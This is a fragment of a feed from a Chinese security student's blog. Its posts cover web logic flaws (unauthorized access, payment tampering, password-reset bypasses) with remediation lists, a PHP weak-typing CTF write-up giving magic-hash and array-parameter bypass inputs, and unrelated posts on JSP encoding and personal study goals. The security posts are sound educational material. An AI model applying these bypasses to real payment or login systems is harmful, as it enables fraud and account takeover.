    <updated>2019-08-30T10:00:43.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逻辑漏洞–-gt-越权访问"><a href="#逻辑漏洞–-gt-越权访问" class="headerlink" title="逻辑漏洞–&gt;越权访问"></a>逻辑漏洞–&gt;越权访问</h1><p>越权访问</p><ul><li><p>未授权访问<br>未授权访问: 就是在没有任何授权的情况下对需要认证的资源进行访问以及增删改查。</p></li><li><p>平行越权<br>平行越权: 同等用户权限之下，不用进入其他用户的账户也可以对别的用户资料或者订单等信息进行增删改查操作的目的。</p></li><li><p>垂直越权<br>垂直越权: 通过低权限向高权限跨越形成垂直越权访问。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;逻辑漏洞–-gt-越权访问&quot;&gt;&lt;a href=&quot;#逻辑漏洞–-gt-越权访问&quot; class=&quot;headerlink&quot; title=&quot;逻辑漏洞–&amp;gt;越权访问&quot;&gt;&lt;/a&gt;逻辑漏洞–&amp;gt;越权访问&lt;/h1&gt;&lt;p&gt;越权访问&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;未授权访问</summary>
      
    
    
    
    
    <category term="笔记" scheme="https://cr4ckm3.top/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="漏洞" scheme="https://cr4ckm3.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>逻辑漏洞 Ⅱ</title>
    <link href="https://cr4ckm3.top/2017/06/07/%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>https://cr4ckm3.top/2017/06/07/%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
    <published>2017-06-07T11:15:54.000Z</published>
    <updated>2019-08-30T10:00:42.453Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逻辑漏洞–-gt-支付漏洞"><a href="#逻辑漏洞–-gt-支付漏洞" class="headerlink" title="逻辑漏洞–&gt;支付漏洞"></a>逻辑漏洞–&gt;支付漏洞</h1><h1 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h1><h2 id="0x00-缺乏数据签名"><a href="#0x00-缺乏数据签名" class="headerlink" title="0x00 缺乏数据签名"></a>0x00 缺乏数据签名</h2><p><a href="https://">乌云案例之顺丰宝业务逻辑漏洞</a></p><h2 id="0x01-URL中含有可修改敏感数据"><a href="#0x01-URL中含有可修改敏感数据" class="headerlink" title="0x01 URL中含有可修改敏感数据"></a>0x01 URL中含有可修改敏感数据</h2><p><a href="">乌云案例之乐视商城逻辑支付漏洞</a></p><h2 id="0x02-替换支付订单，生成两个订单，支付小订单，数据返回替换订单号。"><a href="#0x02-替换支付订单，生成两个订单，支付小订单，数据返回替换订单号。" class="headerlink" title="0x02 替换支付订单，生成两个订单，支付小订单，数据返回替换订单号。"></a>0x02 替换支付订单，生成两个订单，支付小订单，数据返回替换订单号。</h2><p><a href="">乌云案例之读览天下支付逻辑漏洞</a></p><h2 id="0x03-设计缺陷-可提交负人民币的订单"><a href="#0x03-设计缺陷-可提交负人民币的订单" class="headerlink" title="0x03 设计缺陷(可提交负人民币的订单)"></a>0x03 设计缺陷(可提交负人民币的订单)</h2><p><a href="">乌云案例之天翼云盘通支付逻辑漏洞</a></p><h2 id="0x04-订单提交逻辑漏洞-订单提交Burp可修改运费"><a href="#0x04-订单提交逻辑漏洞-订单提交Burp可修改运费" class="headerlink" title="0x04 订单提交逻辑漏洞(订单提交Burp可修改运费)"></a>0x04 订单提交逻辑漏洞(订单提交Burp可修改运费)</h2><p><a href="">乌云案例之药房网订单提交逻辑漏洞</a></p><h2 id="0x05-绕过支付-直接访问构造的URL-Payload可直接绕过。"><a href="#0x05-绕过支付-直接访问构造的URL-Payload可直接绕过。" class="headerlink" title="0x05 绕过支付 直接访问构造的URL Payload可直接绕过。"></a>0x05 绕过支付 直接访问构造的URL Payload可直接绕过。</h2><p><a href="">乌云案例之淘美网绕过支付</a></p><h2 id="0x06-修复方案"><a href="#0x06-修复方案" class="headerlink" title="0x06 修复方案"></a>0x06 修复方案</h2><ul><li>1 和银行交易时，做数据签名，对用户金额和订单签名。</li><li>2 敏感参数不要明文放在URL中</li><li>3 服务端效验客户端提交的参数</li><li>4 在服务端计算金额的时候，一定要判断是否为正数。</li><li>5 支付过程中加一个服务器生成的key，用户校验参数有没有被串改。</li><li>6 如果一定需要用URL传递相关参数，建议进行后端的签名验证</li><li>7 订单金额和充值接口返回的数据进行校验</li><li>8 提交订单时后台判断单价是否与数据库中相符，如不符则返回错误。</li><li>9 支付时应从服务器拉取数据，而不是直接读客户端的值！！</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="">myh0st</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;逻辑漏洞–-gt-支付漏洞&quot;&gt;&lt;a href=&quot;#逻辑漏洞–-gt-支付漏洞&quot; class=&quot;headerlink&quot; title=&quot;逻辑漏洞–&amp;gt;支付漏洞&quot;&gt;&lt;/a&gt;逻辑漏洞–&amp;gt;支付漏洞&lt;/h1&gt;&lt;h1 id=&quot;支付漏洞&quot;&gt;&lt;a href=&quot;#支付漏洞&quot;</summary>
      
    
    
    
    
    <category term="笔记" scheme="https://cr4ckm3.top/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="漏洞" scheme="https://cr4ckm3.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>逻辑漏洞 Ⅰ</title>
    <link href="https://cr4ckm3.top/2017/06/06/%E5%AF%86%E7%A0%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>https://cr4ckm3.top/2017/06/06/%E5%AF%86%E7%A0%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
    <published>2017-06-06T12:14:54.000Z</published>
    <updated>2019-08-30T10:00:45.213Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逻辑漏洞–-gt-密码重置"><a href="#逻辑漏洞–-gt-密码重置" class="headerlink" title="逻辑漏洞–&gt;密码重置"></a>逻辑漏洞–&gt;密码重置</h1><h1 id="密码找回"><a href="#密码找回" class="headerlink" title="密码找回"></a><div  style="text-align: center">密码找回</div></h1><h2 id="0x00-密码找回验证条件可社工"><a href="#0x00-密码找回验证条件可社工" class="headerlink" title="0x00 密码找回验证条件可社工"></a>0x00 密码找回验证条件可社工</h2><p>验证帐号与邮箱地址是否匹配即可<br>验证帐号与手机号是否匹配即可<br><a href="https://www.baidu.com/">.</a></p><h2 id="0x01-验证码可爆破"><a href="#0x01-验证码可爆破" class="headerlink" title="0x01 验证码可爆破"></a>0x01 验证码可爆破</h2><p>验证码多用户通用<br>用户认证体系存在漏洞<br>验证码时效长，可暴力破解验证码<br><a href=""></a></p><h2 id="0x02-修改密码未验证用户"><a href="#0x02-修改密码未验证用户" class="headerlink" title="0x02 修改密码未验证用户"></a>0x02 修改密码未验证用户</h2><p>结构控制不严格，服务端未进行验证。<br>用户ID或邮箱出现在URL，可直接修改。<br><a href=""></a></p><h2 id="0x03-密码修改页面可预测"><a href="#0x03-密码修改页面可预测" class="headerlink" title="0x03 密码修改页面可预测"></a>0x03 密码修改页面可预测</h2><p>可预测URL，直接执行下一步URL可绕过。<br><a href=""></a></p><h2 id="0x04-重置密码新密码出现在返回的数据包中"><a href="#0x04-重置密码新密码出现在返回的数据包中" class="headerlink" title="0x04 重置密码新密码出现在返回的数据包中"></a>0x04 重置密码新密码出现在返回的数据包中</h2><p><a href=""></a></p><h2 id="0x05-密码重置验证码出现在返回数据包中"><a href="#0x05-密码重置验证码出现在返回数据包中" class="headerlink" title="0x05 密码重置验证码出现在返回数据包中"></a>0x05 密码重置验证码出现在返回数据包中</h2><p><a href=""></a></p><h2 id="0x06-验证码接收帐号由客户端决定"><a href="#0x06-验证码接收帐号由客户端决定" class="headerlink" title="0x06 验证码接收帐号由客户端决定"></a>0x06 验证码接收帐号由客户端决定</h2><p>Burp拦截可修改验证码的接收端。<br><a href=""></a></p><h2 id="0x07-修改返回包绕过验证码找回密码"><a href="#0x07-修改返回包绕过验证码找回密码" class="headerlink" title="0x07 修改返回包绕过验证码找回密码"></a>0x07 修改返回包绕过验证码找回密码</h2><p><a href=""></a></p><h2 id="0x08-密码重置验证码多人公用"><a href="#0x08-密码重置验证码多人公用" class="headerlink" title="0x08 密码重置验证码多人公用"></a>0x08 密码重置验证码多人公用</h2><p><a href=""></a></p><h2 id="0x09-修复方案"><a href="#0x09-修复方案" class="headerlink" title="0x09 修复方案"></a>0x09 修复方案</h2><ul><li>1减少验证码有效时间</li><li>2 使用后即销毁</li><li>3 增加验证码复杂程序，整个md5 不困难吧，</li><li>4 限制该功能单个ip提交频率</li><li>5 对重要参数加入验证码同步信息或时间戳；</li><li>6 重置密码后，新密码不应返回在数据包中。</li><li>7 接收验证码的帐号由服务端提供，不能信任客户端提交的数据</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;逻辑漏洞–-gt-密码重置&quot;&gt;&lt;a href=&quot;#逻辑漏洞–-gt-密码重置&quot; class=&quot;headerlink&quot; title=&quot;逻辑漏洞–&amp;gt;密码重置&quot;&gt;&lt;/a&gt;逻辑漏洞–&amp;gt;密码重置&lt;/h1&gt;&lt;h1 id=&quot;密码找回&quot;&gt;&lt;a href=&quot;#密码找回&quot;</summary>
      
    
    
    
    
    <category term="笔记" scheme="https://cr4ckm3.top/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="漏洞" scheme="https://cr4ckm3.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>浅谈PHP弱类型安全之CTF</title>
    <link href="https://cr4ckm3.top/2017/05/08/%E6%B5%85%E8%B0%88php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8%E4%B9%8BCTF/"/>
    <id>https://cr4ckm3.top/2017/05/08/%E6%B5%85%E8%B0%88php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8%E4%B9%8BCTF/</id>
    <published>2017-05-08T02:47:54.000Z</published>
    <updated>2019-08-30T10:00:39.803Z</updated>
    
    <content type="html"><![CDATA[<h1 id="弱类型语言-PHP"><a href="#弱类型语言-PHP" class="headerlink" title="弱类型语言:PHP"></a>弱类型语言:PHP</h1><p>PHP是一种非常弱的类型语言，在大多数编程语言中，变量只能保存一种类型的数据，而且这个类型必须在使用变量之前声明，例如C语言。而在PHP中，变量的类型是由赋给变量的指确定。所有PHP也是一种动态类型语言。</p><p>因此在PHP中，可进行如下赋值：<br>    $a = 123;<br>    $a = “abc”;<br>    $a = arry();</p><h2 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h2><h3 id="等于操作符"><a href="#等于操作符" class="headerlink" title="等于操作符"></a>等于操作符</h3><p><code>$a == $b</code></p><p>在这中情况下存在类型转换的问题，比如<br>    123 == ‘123’     //ture<br>    1 == ‘1abc’      //ture<br>    0 == ‘abc’       //ture<br>    intval(‘3389a’)    //输出3389<br>    “0e132456789” == “0e7124511451155”  //ture<br>    “0e132456789” == “0e1”              //ture<br><code>0 == &#39;abc&#39;</code>为<code>true</code>是因为int型和字符串型比较，字符串型会初始化为整型。’abc’会被初始化为0。</p><p>后面两种<code>0e\d+</code>这种情况的比较，php就会将这种字符串解析为科学计数法，并且判断为相等。<br>如果不满足<code>0e\d+</code>这种模式就不会相等。<br>在CTF中就会考察到该类型。附上做过的一道题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!ctype_alpha(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;<span class="keyword">echo</span> <span class="string">&#x27;Wrong.&#x27;</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (!is_numeric(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;<span class="keyword">echo</span> <span class="string">&#x27;Wrong.&#x27;</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) == md5(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面的代码可看出，要想获取flag的话。<code>user</code>要设置为非字符，<code>password</code>要设置为非数字。并且md5()返回的值相同。所以可利用上面说的<code>0e\d+</code>这种模式便可绕过。<br>    240610708       md5(‘240610708’);   // 0e462097431906509019562988736854<br>    QNKCDZO         md5(‘QNKCDZO’);     // 0e830400451993494058024219903391<br>类似的还有:<br>    md5(‘aabg7XSs’) == md5(‘aabC9RqS’));<br>    sha1(‘aaroZmOk’) == sha1(‘aaK1STfY’));<br>    sha1(‘aaO8zKZF’) == sha1(‘aa3OFF9m’));<br>防御:<br>对上面出现的弱类型可用<code>$a === $b</code>进行防御。</p><h3 id="恒等操作符"><a href="#恒等操作符" class="headerlink" title="恒等操作符:"></a>恒等操作符:</h3><p><code>$a === $b</code></p><p>但恒等于也存在可被绕过的问题，下面一题也是CTF中常涉及的一道题。<br>此题涉及到md5()函数的参数类型。</p><p><code>string md5 ( string $str [, bool $raw_output = false ] )</code></p><p>md5()函数需求接收的是String类型的参数，但当我们传入的是arry时，md5()只会警告<code>Warning: md5() expects parameter 1 to be string, array given</code>并无法计算出arry的md5值，这样我们传入两个arry参数时，会返回两个NULL值，也就是造成NULL=NULL，从而可成功绕过<code>$a === $b</code>这样的判断。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>防御:<br>对于此类的防御是,在获取从变量前先判断获取的变量是否是数组便可。</p><h2 id="比较函数"><a href="#比较函数" class="headerlink" title="比较函数"></a>比较函数</h2><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h3><p><code>int strcmp ( string $str1 , string $str2 )</code><br>strcmp()函数对传入的两个字符串参数进行比较。该函数返回：</p><pre><code> 0 - 如果两个字符串相等&lt;0 - 如果 string1 小于 string2&gt;0 - 如果 string1 大于 string2</code></pre><p>strcmp()函数本质上是将两个参数转换为ascii然后在做数学的减法，再返回一个int的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$flag</span>) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>上面的代码看来，只要判断<code>password</code>与<code>$flag</code>相等，便可返回Flag。<br>这里可传入<code>password[]=x</code>便可使这个函数出错返回NULL。此时NULL==0，是bool(true)。这样便可成功绕过。</p><h1 id="另注"><a href="#另注" class="headerlink" title="另注"></a>另注</h1><pre><code>先注册密码为240610708的用户A。然后用密码QNKCDZO尝试登录用户A。倘若成功登录，则证明此网站采用了不完备的加密体制md5一次加密。先注册密码为0E33455555的用户A。然后用密码0E234230570345尝试登录用户A。倘若成功登录，则证明此网站采用了明文进行存储密码！</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;弱类型语言-PHP&quot;&gt;&lt;a href=&quot;#弱类型语言-PHP&quot; class=&quot;headerlink&quot; title=&quot;弱类型语言:PHP&quot;&gt;&lt;/a&gt;弱类型语言:PHP&lt;/h1&gt;&lt;p&gt;PHP是一种非常弱的类型语言，在大多数编程语言中，变量只能保存一种类型的数据，而且这</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://cr4ckm3.top/tags/CTF/"/>
    
    <category term="PHP弱类型" scheme="https://cr4ckm3.top/tags/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>关于字符编码</title>
    <link href="https://cr4ckm3.top/2017/04/07/%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98/"/>
    <id>https://cr4ckm3.top/2017/04/07/%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98/</id>
    <published>2017-04-07T12:50:00.000Z</published>
    <updated>2019-08-30T10:00:44.183Z</updated>
    
    <content type="html"><![CDATA[<p>在学习Jsp的过程中在编写的文件含有中文的情况下即使ContenType里的charset=gb2312的时候，客户端显示的页面会有乱码情况。<br>于是便开始查询了相关资料。</p><span id="more"></span><div style="text-align: center">其中困扰的问题是：1,windows的自带记事本下的ANSI编码是什么？2,设置了charset=gbk/gb2312为什么还会回乱码？3,pageEncoding和charset的区别？4,如果charset=utf-8又会怎么样？</div><hr><p style="text-align:center;">先了解一些基本知识。</p><h1 id="关于Jsp"><a href="#关于Jsp" class="headerlink" title="关于Jsp"></a>关于Jsp</h1><p>在JSP标准的语法中，如果pageEncoding属性存在，那么JSP页面的字符编码方式就由pageEncoding决定，否则就由contentType属性中的 charset决定，如果charset也不存在，JSP页面的字符编码方式就采用默认的ISO-8859-1。</p><h2 id="pageEncoding"><a href="#pageEncoding" class="headerlink" title="pageEncoding"></a>pageEncoding</h2><p>pageEncoding的内容只是用于jsp输出时的编码，不会作为header发出去的。</p><p>pageEncoding   是通知web server jsp的编码。&lt;%@pagepageEncoding=”UTF-8” %&gt;作用：<br>告诉JSP编译器在将JSP文件编译成Servlet时使用的编码。通常，在JSP内部定义的字符串(直接在JSP中定义，而不是从浏览器提交的数据)出现乱码时，很多都是由于该参数设置错误引起的。</p><p>pageEncoding是jsp文件本身的编码。</p><h2 id="ContentType"><a href="#ContentType" class="headerlink" title="ContentType"></a>ContentType</h2><p>ContentType属性指定响应的 HTTP内容类型。如果未指定 ContentType，默认为Text/Html。</p><p>ContentType属性指定了MIME类型和JSP页面回应时的字符编码方式。MIME类型的默认值是“text/html”; 字符编码方式的默认值是“ISO-8859-1”. MIME类型和字符编码方式由分号隔开。</p><p>contentType的charset是指服务器发送给客户端时的内容编码，contentType里的charset=utf-8是指示页面的输出方式为utf-8。</p><h2 id="编码阶段"><a href="#编码阶段" class="headerlink" title="编码阶段"></a>编码阶段</h2><p>JSP编码要经过三个阶段，第一阶段会用pageEncoding，第二阶段会用utf-8至utf-8，第三阶段就是由Tomcat出来的网页，用的是contentType。</p><p>第一阶段是jsp编译成.Java，它会根据pageEncoding的设定读取jsp，结果是由指定的编码方案翻译成统一的UTF-8 JAVA源码（即.java），如果pageEncoding设定错了，或没有设定，出来的就是中文乱码。 </p><p>第二阶段是由JAVAC的JAVA源码至Java byteCode的编译，不论JSP编写时候用的是什么编码方案，经过这个阶段的结果全部是UTF-8的encoding的java源码。 </p><p>JAVAC用UTF-8的encoding读取java源码，编译成UTF-8 encoding的二进制码（即.class），这是JVM对常数字串在二进制码（java encoding）内表达的规范。 </p><p>第三阶段是Tomcat（或其的application Container）载入和执行阶段二的来的JAVA二进制码，输出的结果，也就是在客户端见到的，这时隐藏在阶段一和阶段二的参数contentType就发挥了功效。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>下面总结下，如何防止中文乱码。<br>1、对于同一个应用，最好统一编码，推荐为UTF-8，当然GBK也可以。<br>2、正确设置JSP的pageEncoding参数<br>3、在所有的JSP/Servlet中设置contentType=”text/html;charset=UTF-8”或response.setCharacterEncoding(“UTF-8”)，从而间接实现对浏览器编码的设置。</p><h1 id="补充一点"><a href="#补充一点" class="headerlink" title="补充一点"></a>补充一点</h1><p>1.&lt;%@ page contentType=”text/html; charset=utf-8”%&gt;<br>2.&lt;%@ page pageEncoding=”utf-8”%&gt;<br>3.&lt;.meta http-equiv=”Content-Type” content=”text/html; charset=utf-8”&gt;<br>4.&lt;% request.setCharacterEncoding(“utf-8”); %&gt;</p><p>1和2都是jsp本身的编码设置，contenttype是服务器发给客户端的内容编码设置，pageencoding是当前jsp页面的本身的编码</p><p>3是HTML网页的编码方式，如果不是jsp页面，普通的HTML里要设置这个才能让中文不乱码<br><a href="http://www.w3school.com.cn/tags/tag_meta.asp">Html.meta标签</a></p><p>4是HttpRequest对象本身的编码，是客户端请求时的编码格式。</p><hr><h1 id="关于字符编码"><a href="#关于字符编码" class="headerlink" title="关于字符编码"></a>关于字符编码</h1><h2 id="ANSI"><a href="#ANSI" class="headerlink" title="ANSI"></a>ANSI</h2><p>Windows 里说的「ANSI」其实是 Windows code pages，这个模式根据当前locale选定具体的编码，比如简体中文locale下是GBK</p><p>使用1至4个字节来代表一个字符的各种汉字延伸编码方式，称为 ANSI 编码。在简体中文Windows操作系统中，ANSI 编码代表 GBK 编码；在日文Windows操作系统中，ANSI编码代表Shift_JIS编码。不同ANSI编码之间互不兼容，当信息在国际间交流时，无法将属于两种语言的文字，存储在同一段 ANSI 编码的文本中。当然对于ANSI编码而言，0x00~0x7F之间的字符，依旧是1个字节代表1个字符。这一点是ANSI编码与Unicode编码之间最大也最明显的区别。</p><h2 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h2><p>区分 带BOM的UTF-8 与 无带BOM的UTF-8<br>带BOM的是微软自作聪明的毛病，一般使用不带BOM的UTF-8。</p><p>UTF-8中的字符可以是 1-4 个字节长。UTF-8可以表示Unicode标准中的任意字符。UTF-8向后兼容 ASCII。UTF-8 是网页和电子邮件的首选编码。UTF-8是Unicode的实现方式之一。</p><p>Unicode是一个字符集(character set),utf-8是一种编码(encoding)。</p><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>百度百科<br><a href="http://blog.csdn.net/kerrywang/article/details/4454895">木头的天空的博客</a><br><a href="https://www.zhihu.com/question/20650946">知乎</a><br><a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8">阮一峰的博客</a><br><a href="http://www.cnblogs.com/muanblog/p/4604809.html">JSP编码问题详解</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在学习Jsp的过程中在编写的文件含有中文的情况下即使ContenType里的charset=gb2312的时候，客户端显示的页面会有乱码情况。&lt;br&gt;于是便开始查询了相关资料。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Unicode" scheme="https://cr4ckm3.top/tags/Unicode/"/>
    
    <category term="编码" scheme="https://cr4ckm3.top/tags/%E7%BC%96%E7%A0%81/"/>
    
    <category term="Jsp" scheme="https://cr4ckm3.top/tags/Jsp/"/>
    
  </entry>
  
  <entry>
    <title>杂谈</title>
    <link href="https://cr4ckm3.top/2017/04/06/%E6%9D%82%E8%B0%88/"/>
    <id>https://cr4ckm3.top/2017/04/06/%E6%9D%82%E8%B0%88/</id>
    <published>2017-04-06T13:14:54.000Z</published>
    <updated>2019-08-30T10:00:40.603Z</updated>
    
    <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=280 height=52 src="//music.163.com/outchain/player?type=0&id=2213825453&auto=1&height=32"></iframe><span id="more"></span><p style="text-align: center;">看到倒计时距离大三结束也就只有100天，停下手上的工作，脑海中不禁的想了想在大学的这三年，这三年里我究竟学了些什么，学会了些什么，而又能做些什么。</p><h2 id="反思过去的三年"><a href="#反思过去的三年" class="headerlink" title="反思过去的三年"></a>反思过去的三年</h2><p>在这三年里，我虽然有在学课本上的知识，也在自学课外的知识。但都是学到一半，然后又看到一些其他新知识。然后就会放下当前的学习进度去学另一门知识。反反复复，也就什么都懂一点，然而什么都不会，也不精。C/JAVA/JSP/PHP/Python都有所了解，可都不精。这种20出头年龄对社会上的好奇心也重，看到什么都想学。所以导致现在无一技之长，等于什么都不会。况且在这毕业季看到各种师兄、师姐的诉苦，自己更是心烦意燥。在这过去的三年里也更是混日子混得多，只是完成老师布置的作业，此外也很少自己深入学习课本知识。这是个坏习惯，好在及时更改。如今遇到问题，第一时间不会是向人家求解，而是自己独自解决问题，通过各种搜索引擎，查阅资料等办法去解决问题。这是收获最大的一点。懂得如何获取课本上没有的知识。<br>另外一点，也是最近觉得很重要的一点。此博客已经建立的有半年左右，却很少更新。在原本的思维里觉得更新博客会很费时间，但其实并不如此。在写下东西的同时，大脑会把知识整理一遍，然后再写下来记录在博客上。第一方便以后查阅、第二是方便记下一些平时在学习上、看书时的一些心得又或者是些易于忘记的知识点。所以以后会多些记录下自己的心得。三年过去了，欠下的终究要还。</p><h2 id="接下来的日子里"><a href="#接下来的日子里" class="headerlink" title="接下来的日子里"></a>接下来的日子里</h2><p style="text-align: center;">猪猪侠分享了他的“白帽学习路线”，看过之后有一句话是值得我们学习的：学会如何学习，培养学习习惯，锻造学习力。 为了能到远方，脚下的每一步都不能少。<p style="text-align: center;">在此为自己定了个小目标，一直努力下去。<hr><h2 id="给自己的忠告"><a href="#给自己的忠告" class="headerlink" title="给自己的忠告"></a>给自己的忠告</h2><div style="text-align: center">1.坚持，不要三天打鱼两天晒网；2.静心，不要心烦气躁整天抱怨；3.学习，关注安全技术扎实基础；4.视野，学会变通切勿钻牛角尖；5.信念，坚持对的事情不要堕落。</div><h1 id="Just-do-it"><a href="#Just-do-it" class="headerlink" title="Just do it!!"></a>Just do it!!</h1>]]></content>
    
    
    <summary type="html">&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=280 height=52 src=&quot;//music.163.com/outchain/player?type=0&amp;id=2213825453&amp;auto=1&amp;height=32&quot;&gt;&lt;/iframe&gt;</summary>
    
    
    
    
    <category term="杂记" scheme="https://cr4ckm3.top/tags/%E6%9D%82%E8%AE%B0/"/>
    
    <category term="心得" scheme="https://cr4ckm3.top/tags/%E5%BF%83%E5%BE%97/"/>
    
  </entry>
  
  <entry>
    <title>Linux</title>
    <link href="https://cr4ckm3.top/2016/08/28/Linux/"/>
    <id>https://cr4ckm3.top/2016/08/28/Linux/</id>
    <published>2016-08-28T02:47:54.000Z</published>
    <updated>2019-08-30T10:00:41.583Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一般来说著名的linux系统基本上分两大类："><a href="#一般来说著名的linux系统基本上分两大类：" class="headerlink" title="一般来说著名的linux系统基本上分两大类："></a>一般来说著名的linux系统基本上分两大类：</h1><p>1.RedHat系列：Redhat、Centos、Fedora等<br>2.Debian系列：Debian、Ubuntu等 </p><h2 id="RedHat-系列"><a href="#RedHat-系列" class="headerlink" title="RedHat 系列"></a>RedHat 系列</h2><p>1 常见的安装包格式 rpm包,安装rpm包的命令是“rpm -参数”<br>2 包管理工具 yum<br>3 支持tar包 </p><h2 id="Debian系列"><a href="#Debian系列" class="headerlink" title="Debian系列"></a>Debian系列</h2><p>1 常见的安装包格式 deb包,安装deb包的命令是“dpkg -参数”<br>2 包管理工具 apt-get<br>3 支持tar包 </p><h3 id="一、yum安装。"><a href="#一、yum安装。" class="headerlink" title="一、yum安装。"></a>一、yum安装。</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 